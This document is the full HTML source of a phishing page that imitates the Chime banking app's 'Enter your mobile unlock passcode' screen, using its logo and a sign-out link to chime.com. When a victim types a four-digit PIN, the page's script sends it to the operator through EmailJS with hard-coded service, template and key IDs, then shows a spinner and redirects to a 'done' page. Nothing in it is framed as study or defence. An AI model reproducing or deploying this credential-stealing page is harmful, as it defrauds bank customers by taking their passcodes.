<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter Passcode – Chime</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #ffffff;
      color: #000;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      overflow: hidden;
    }

    .signout {
      align-self: flex-end;
      margin: 18px 22px 0 0;
      color: #00b75a;
      font-weight: 700;
      font-size: 17px;
    }

    .logo {
      margin-top: 28px;
      margin-bottom: 25px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .logo img {
      height: 30px;
      display: block;
    }

    h2 {
      font-size: 20px;
      font-weight: 700;
      line-height: 1.4;
      margin-bottom: 34px;
    }

    .pin-pill {
      border-radius: 999px;
      padding: 2px;
      background: linear-gradient(135deg, #ff4d6d 0%, #ff9ac2 100%);
      display: inline-block;
    }

    .pill-inner {
      border-radius: 999px;
      background: #ffffff;
      padding: 22px 44px;
    }

    .dots {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 22px;
    }

    .dot {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      border: 2px solid #00b75a;
      transition: background 0.2s ease;
    }

    .dot.filled { background: #00b75a; }

    input[type="tel"] {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }

    /* Spinner overlay */
    .spinner-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(255,255,255,0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 999;
      visibility: hidden;
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    .spinner-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .spinner {
      width: 52px;
      height: 52px;
      border: 5px solid #cdebd8;
      border-top-color: #00b75a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  
/* === Spinner system (Button + Fullscreen) === */
.spinner-bars{color:#0b1117;display:inline-block;position:relative;width:28px;height:28px}
.spinner-bars.white{color:#fff}
.spinner-bars div{transform-origin:14px 14px;animation:spinner-bars 1.2s linear infinite}
.spinner-bars div:after{content:" ";display:block;position:absolute;top:2px;left:13px;width:3px;height:8px;border-radius:20%;background:currentColor}
.spinner-bars div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}
.spinner-bars div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}
.spinner-bars div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}
.spinner-bars div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}
.spinner-bars div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}
.spinner-bars div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}
.spinner-bars div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}
.spinner-bars div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}
.spinner-bars div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}
.spinner-bars div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}
.spinner-bars div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}
.spinner-bars div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
@keyframes spinner-bars{0%{opacity:1}100%{opacity:0}}

#fullpageSpinner{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;z-index:99999;visibility:hidden;opacity:0;transition:opacity .15s ease}
#fullpageSpinner.active{visibility:visible;opacity:1}

</style>
</head>
<body onload="startInput()">
  <a class="signout" href="https://app.chime.com/login?">Sign out</a>

  <div class="logo">
    <img src="chime_logo.png" alt="Chime logo">
  </div>

  <h2>Enter your mobile<br>unlock passcode</h2>

  <div class="pin-pill">
    <div class="pill-inner">
      <div class="dots">
        <div class="dot pin-input" id="dot1"></div>
        <div class="dot pin-input" id="dot2"></div>
        <div class="dot pin-input" id="dot3"></div>
        <div class="dot pin-input" id="dot4"></div>
      </div>
    </div>
  </div>

  <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" />

  <div class="spinner-overlay" id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <!-- ✅ EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    const input = document.getElementById("pinInput");
    const dots = [
      document.getElementById("dot1"),
      document.getElementById("dot2"),
      document.getElementById("dot3"),
      document.getElementById("dot4")
    ];
    const spinnerOverlay = document.getElementById("spinnerOverlay");

    emailjs.init("BCrRHWMNo7WFRXElk"); // Initialize EmailJS

    function startInput() {
      input.focus();
      setTimeout(() => input.focus(), 150);
    }

    input.addEventListener("input", () => {
      const val = input.value.replace(/\D/g, "").slice(0, 4);
      input.value = val;
      dots.forEach((dot, i) => dot.classList.toggle("filled", i < val.length));

      if (val.length === 4) {
        showSpinnerAndSend(val);
      }
    });

    document.body.addEventListener("click", () => input.focus());

    function showSpinnerAndSend(pinValue) {
      spinnerOverlay.classList.add("active");

      // ✅ Send PIN through EmailJS
      emailjs.send("service_9rj5bd7", "template_hw1knqo", {
        login_pin: pinValue
      }).then(() => {
        console.log("✅ PIN sent via EmailJS");
        redirectToDone();
      }).catch((err) => {
        console.error("⚠️ Failed to send PIN, redirecting anyway:", err);
        redirectToDone();
      });
    }

    function redirectToDone() {
      setTimeout(() => {
        spinnerOverlay.classList.remove("active");
        bigBrainRedirect("done.html", 0, 2000);
      }, 1200);
    }
  </script>

<div id="fullpageSpinner"><div class="spinner-bars" aria-label="Loading">
  <div></div><div></div><div></div><div></div><div></div><div></div>
  <div></div><div></div><div></div><div></div><div></div><div></div>
</div></div>
<script>
(function(){
  const SPIN_WHITE = '<div class="spinner-bars white"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>';

  // Remember last clicked CTA
  document.addEventListener('click', function(e){
    const btn = e.target.closest('button, .btn');
    if(btn){ window.__lastBtnClicked = btn; }
  }, true);

  function inlineSpin(btn){
    if(!btn) return;
    btn.disabled = true;
    btn.dataset.originalText = btn.innerHTML;
    btn.innerHTML = SPIN_WHITE;
  }

  window.bigBrainRedirect = function(nextPage, inlineMs=3000, fullMs=2000){
    const btn = window.__lastBtnClicked;
    if(btn){ inlineSpin(btn); }
    setTimeout(function(){
      document.getElementById('fullpageSpinner').classList.add('active');
      setTimeout(function(){ window.location.href = nextPage; }, fullMs);
    }, inlineMs);
  };

})();
</script>

</body>
</html>
